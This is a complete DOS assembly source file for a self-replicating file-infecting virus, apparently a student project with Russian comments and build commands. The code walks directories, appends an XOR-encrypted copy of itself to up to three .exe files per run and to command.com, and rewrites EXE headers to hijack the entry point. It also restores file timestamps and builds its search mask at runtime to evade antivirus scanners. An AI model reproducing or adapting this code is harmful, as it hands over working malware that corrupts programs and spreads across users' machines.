;Имя:		virus
;Авторы:	Иван и Илья (ИВТ-09)

;Для компиляции
;tasm virus.asm /m2
;tlink virus.obj /t
 
.model tiny ;Модель памяти - tiny, Адресация кода - near, Адресация данных - near, Операционная система - ms-dos, Чередование кода и данных - допустимо
 
Code segment byte
assume cs:code,ds:code,es:code,ss:code
 
.386 ;для 32-разрядных процессоров
 
org 100h ;стандартно для com-файлов
 
 LEN		equ offset OFF - offset Entry
 Decriptor	equ offset EndDeCriptor - offset BeginDeCriptor
 DecSize	equ offset EndDeCriptor - offset Entry
 _IP		equ 14h
 _CS		equ 16h
 _SP		equ 10h
 _SS		equ 0eh
 PageCnt	equ 4h
 PartPag	equ 2h
 HdrSize    equ 8h
 DTATime    equ 16h
 DTADate    equ 18h
 
Entry:

push cs                         ;сохраним cs (Регистр CS указывает на начало блока памяти объемом 64К)
mov bp,sp                       ;bp теперь содержит текущую границу стека
mov bx,ss:[bp]                  ;bx = cs	                        
push bx                         ;сохраним bx
pop ds                          ;достанем ds (Регистр DS указывает  на  начало  сегмента  данных)
                                
call $+3                        ;получим смещение тела вируса
Label1:                         
                                
pop bp                          ;достанем bp
sub bp,offset Label1            ;bp-смещение для вируса->bp

;Алогоритм шифровки                             
BeginDeCriptor:                 
                                
cmp byte ptr[$+Decriptor],80h   
je DDD                          
                               
lea si,[EndDeCriptor + bp]     
mov cx,Len - DecSize - 2       
mov al,[Checker + bp]          
                               
add byte ptr [Cript + bp],30h   
                               
Cript:  db 00h,04h          ;модифицирующийся код   
        inc si                 
        loop Cript
		
;возвращаемся без шифровки  
EndDeCriptor:     
sub byte ptr [Cript + bp],30h  
DDD:                 
                             
mov [_ES + bp],es              
mov [Flag + bp],0               
push cs                        
pop es  
                              
;Сохраним для текущего файла результат шифровки                       
lea si,[IP_File + bp]          
lea di,[IP_ + bp]               
movsd                          
movsd                           
                               
call Main_Code                  ;Перейдем к основной части программы
                                
Exit:                           
int 20h                         ;завершить программу
                               
;----------------------------------------------------------------------------
Main_Code proc near             
                                
mov byte ptr[InfectCount + bp],00h ;счетчик заражения
                               
;Получаем имя диска               
        mov ah,19h             
        int  21h   ;имя диска по умолчанию для ДОС               
        push ax    ;сохраним ax              
        add al,'A' ;добавим к имени диска 'A', чтобы получить имя диска в форме ACSII             
                                
 
	    mov [PATH + bp],al
        mov word ptr [PATH + 1 + bp],'\:'
                                
        cmp al,'A'              ;сравним с 'A'
        jne Cur_Dir             ;если нет, то следующий
        add al,2                ;если да, то прыгаем                        
        jmp l                   ;на диск C
Cur_Dir:
 
;Получаем имя директории
	mov ah,47h ;дать умалчиваемое оглавление DOS
	pop dx     ;достанем dx
	inc dx     ;увеличем на 1
	lea si,[PATH + 3 + bp] ;сохраним адрес текущего файла в SI
	int 21h
 
l:	
	    lea si,[PATH + bp]
Next_Symbl: 
		lodsb ;загрузим символ для вывода
	    cmp al,0 ;сравним с 0
	    jne Next_Symbl ;если не 0, то дальше
		
	mov word ptr[_SI + bp],si ;SI это конец пути 
;шифруем маску '*.exe' от антивирусов
	mov dword ptr [si - 1],'e.*\'	
	mov word ptr [si + 3],'ex'
	mov byte ptr [si + 5],0 
 
	call WorkWithDir    ;переходим к этой директории
 
	call FindSubDir     ;переходим к поддиректориям 
 
;заражаем command.com
	lea si,[Cmd + bp]
	lea di,[Path + bp]
	mov cx,15		;размер command.com = 15
	rep movsb       ;Перешлем все имя
	mov byte ptr [Flag + bp],1
	call InfectExe	;перейдем к заражению exe-файла 
 
	call CureEXE    ;завершим заражение
 
	retn
Main_Code endp
 

FindSubDir proc near
;получаем имена поддиректорий 
;установим DTADIR
	mov ah,1ah ;установить адрес DTA
	lea dx,[DTADIR + bp] ;текущая директория
	int 21h
 
	mov word ptr[si],'.*'
	mov byte ptr[si + 2],0 
 
;Найдем первую
	lea dx,[PATH + bp] ;путь в dx
	mov cx,10h
	mov ah,4eh ;Найти 1-й совпадающий файл
	int 21h 
 
Next_Sub:	
;Найдем следующую
	mov ah,4fh ;Найти следующий совпадающий файл
	lea dx,[DTADIR + bp] ;адрес DTADIR
	int 21h
	jc NoSubDirs ;если поддиректории нет, то завершаем
	cmp [DTADIR + 1eh + bp],'.' ;есть еще поддиректории?
	je Next_Sub ;переходим к ним 
 
	mov di,[_SI + bp]
	lea si,[DTADIR + 1eh + bp]
l1:	
	lodsb ;копируем строку с адресом 
	stosb ;в другую
	cmp al,0 ;равна 0?
	jne l1 ;если нет, ищем дальше
	
;шифруем маску '*.exe' от антивирусов 
	mov dword ptr [di - 1],'e.*\'	
	mov word ptr [di + 3],'ex'
	mov byte ptr [di + 5],0
 
	mov si,di
 
	call WorkWithDir ;переходим к заражению в директории
 
;устанавливаем DTADIR
	mov ah,1ah
	lea dx,[DTADIR + bp]
	int 21h	 
 
	jmp Next_Sub 
;если нет поддиректорий 
NoSubDirs:
 
	retn
FindSubDir endp	
 

WorkWithDir proc near	;Данные: PATH = Directory + *.exe
 
;устанвливаем DTA
	mov ah,1ah
	lea dx,[DTA + bp]
	int 21h
 
;находим первый файл
	lea dx,[PATH + bp]
	mov cx,10h
	mov ah,4eh
	int 21h
	jc _EX
 
Infect:
;Заражаем	
	cmp [InfectCount + bp],3h ;проверяем счетчик заражений
	jae Not_Infect            ;если превышаем, то закругляемся
 
	push si
	call InfectEXE            ;переходим к заражению
	pop si
Not_Infect:                
;если не заражем, то ищем следующий файл
	mov ah,4fh
	lea dx,[DTA + bp]
	int 21h
	jc _EX  ;если не exe,то он не подходит
	jmp Infect ;заражаем дальше
 
_EX:
	retn
WorkWithDir endp
 

InfectEXE proc near
;Вычислем полный путь файла
	cmp byte ptr [Flag + bp],1
	je Op ; если файл подходит - заражаем
 
	mov di,si
	lea si,[DTA + 1eh + bp]
l2:
	lodsb
	stosb
	cmp al,0
	jne l2	 
 
;Открываем файл для чтения/записи
Op:		
	mov ax,3d02h
	lea dx,[PATH + bp]
	int 21h
	jnc Opend
 
	retn
 
Opend: 
;Считываем заголовок
	xchg ax,bx	
	mov ah,3fh
	mov cx,1ch
	lea dx,[Header + bp]
	int 21h
 
;Это exe-файл?
	cmp word ptr[Header + bp],'ZM'
	jne CloseF
	
;Уже заражен? 
	mov ax,4202h ;ah=42h - установить указатель файла, al=02h - переместить к концу файла + CX:DX
	mov cx,-1
	mov dx,-2
	int 21h
 
	mov ah,3fh ;читать файл через описатель
	mov cx,2 ;CX = число считываемых байт
	lea dx,[CHK + bp] ;DS:DX = адрес буфера для чтения данных 
	int 21h
 
	mov al,byte ptr[CHK + bp]
	add al,byte ptr[CHK + bp + 1]
	cmp al,0FFh ;проверяем на переполнение
	je CloseF ;если да, то закрываем фалй
 
;Получаем размер файла
	mov ax,4202h ;установить указатель файла и переместить к концу файла + CX:DX 
	xor cx,cx ;обнуляем
	xor dx,dx ;и перемещаемся в самый конец
	int 21h
	push ax
	push dx
 
;Проверка на оверлей
	mov si,ax
	mov ax,word ptr[Header + PageCnt + bp]
	dec ax
	mov cx,512
	mul cx
	add ax,word ptr[Header + PartPag + bp]
	cmp ax,si
 
	jz M1 ;если не оверлей, то продолжаем
	pop dx
	pop ax
	jmp CloseF ;иначе закрываем файл
M1: 
	pop dx
	pop ax
 
	push ax
	push dx 
;Вычисляем новый размер файла в параграфах
	add ax,Len
	adc dx,0
	mov cx,512
	div cx
	or dx,dx
	jz New_Len
	inc ax
New_len:
 
;Сохраняем размер файла в заголовке
	mov word ptr [Header + PageCnt + bp],ax
	mov word ptr [Header + PartPag + bp],dx
 
;Записываем измененный заголовок 
	lea si,[Header + _IP + bp]
	lea di,[IP_File + bp]
	movsw
	lea si,[Header + _CS + bp]
	lea di,[CS_File + bp]
	movsw
	lea si,[Header + _SS + bp]
	lea di,[SS_File + bp]
	movsw
	lea si,[Header + _SP + bp]
	lea di,[SP_File + bp]
	movsw 
 
;Вычиляем новую точку входа
	pop dx
	pop ax 
 
	sub ax,100h
	mov cx,10h
	div cx
 
	add dx,100h
 
	sub ax,word ptr [Header + HdrSize + bp] 
 
	mov word ptr [Header + _CS + bp],ax
	mov word ptr [Header + _IP + bp],dx
	mov word ptr [Header + _SS + bp],ax
	mov word ptr [Header + _SP + bp],2000h
 
;Возвращаем старый заголовок
	mov ax,4200h ;установить указатель файла - LSEEK
	xor cx,cx
	xor dx,dx
	int 21h
 
	mov ah,40h ;писать в файл через описатель
	lea dx,[Header + bp] ;получаес адрес нашего заголовка
	mov cx,1ch ;28 байт в заголовке
	int 21h
 
;Создаем проверку	
	mov ah,2ch; дать время DOS
	int 21h
    ;CH: часы (0 до 23)+ CL: минуты (0 до 59)+ DH: секунды (0 до 59)+ DL: сотые доли секунды (0 до 99) -> DL
	add dl,dh
	add dl,cl
	add dl,ch
 
	mov byte ptr[Checker + bp],dl ;запишим результат по адресу
 
	mov al,255 ;255->al
	sub al,dl  ;al-dl->al
	mov byte ptr [Checker + bp + 1],al ;результат запишим еще на байт дальше
 
;Записываем тело вируса в конец
	lea si,[Entry + bp]
	lea di,[Cripted + bp]
	mov cx,DecSize
 
l3:	
	rep
	movsb
  
;Расшифруем
	mov cx,LEN - DecSize - 2
 
l4: 
	lodsb
	xor al,[Checker + bp]
	stosb
	dec cx
	cmp cx,0
	jne l4
	movsw	
 
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	int 21h
 
	mov ah,40h
	lea dx,[Cripted + bp]
	mov cx,len
	int 21h 
 
	inc [InfectCount + bp]
	
CloseF: 
;Устанавливаем дату создания прежней
	mov ax,5701h
	mov cx,word ptr [DTA + DTATime + bp]
	mov dx,word ptr [DTA + DTADate + bp]
	int 21h
 
;Закрываем файл
	mov ah,3eh
	int 21h 
 
	retn
 
InfectEXE endp

 
CureEXE proc near
;Возврат управления exe-файлу
 
;устанвливаем OLDDTA
	mov ah,1ah
	mov dx,80h
	int 21h	
;Сравниваем с изначальным источником
	cmp bp,0 
	jne ExT
 
	retn
ExT:
	cmp byte ptr [Checker + bp],0FCh
	jle NoMess
 
	mov ah,09h
	lea dx,[NM + bp]
	int 21h
 
NoMess:	
 
	mov ax,[_ES + bp]
	mov es,ax
 
	add ax,10h
	add word ptr [CS_ + bp],ax
 
	mov ax,word ptr[CS_ + bp]
	sub ax,10h
	mov ds,ax
 
	cli	;oчистим флаг глобального прерывания в регистре статуса (SREG)
	add ax,word ptr cs:[SS_ + bp]
	mov ss,ax
	mov sp,word ptr cs:[SP_ + bp]
	sti ;устанавливаем флаг разрешения прерываний
 
;Обнуляем регистры
	xor ax,ax
   	xor bx,bx
	xor cx,cx
   	xor dx,dx
   	xor si,si
   	xor di,di
   	xor bp,bp
 
	db 0eah

;обнуляем измененные IP,CS,SS,SP
EXEJump:   
	    IP_ dw 00h
	    CS_ dw 00h
	    SS_ dw 00h
	    SP_ dw 00h
 
 
CureEXE endp
 
 
;Данные
 
NM	db 'Virus',0Dh,0Ah,'$'
	db 'for ChitGU',0
Cmd	db 'c:\command.com',0
 
;Исходные данные из заголовка файла 
IP_File		dw 9090h
CS_File		dw 9090h
SS_File		dw 9090h
SP_File		dw 9090h
 
Checker		db 250
		    db 5
OFF:
_ES		    dw ?
_DS		    dw ?
_SI		    dw ?
InfectCount	db ?
Flag		db ?
AttrAndDate	db 5 dup (?)
DTA		    db 128 dup (?)
DTADIR		db 128 dup (?)
Header		db 1ch dup (?)
CHK		    dw ?
FULLPATH	db 100 dup (?)
PATH		db 100 dup (?)
Cripted		db ?
 
ends Code
end Entry

